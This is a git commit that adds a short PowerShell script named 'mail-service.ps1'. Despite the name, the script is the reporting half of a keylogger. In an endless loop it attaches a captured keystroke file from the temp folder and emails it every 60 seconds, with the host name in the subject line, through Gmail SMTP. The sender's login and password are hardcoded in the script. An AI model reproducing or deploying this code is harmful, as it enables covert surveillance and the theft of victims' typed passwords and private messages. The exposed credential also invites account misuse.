b9e4a2bd33e62cdb57052427a89321ffc2617a93
gabrielg13rojas <gabrielg13rojas@gmail.com>
2023-05-04 10:50:38 -0400

    Add files via upload

---
+++ mail-service.ps1
@@ -0,0 +1,9 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('01100111.m3rc3h4ck@gmail.com', 'jjjcbfzmpbxyqaeo')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = '01100111.m3rc3h4ck@gmail.com'
+$ReportEmail.To.Add('gabrielg13rojas@gmail.com')
+$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 60} 
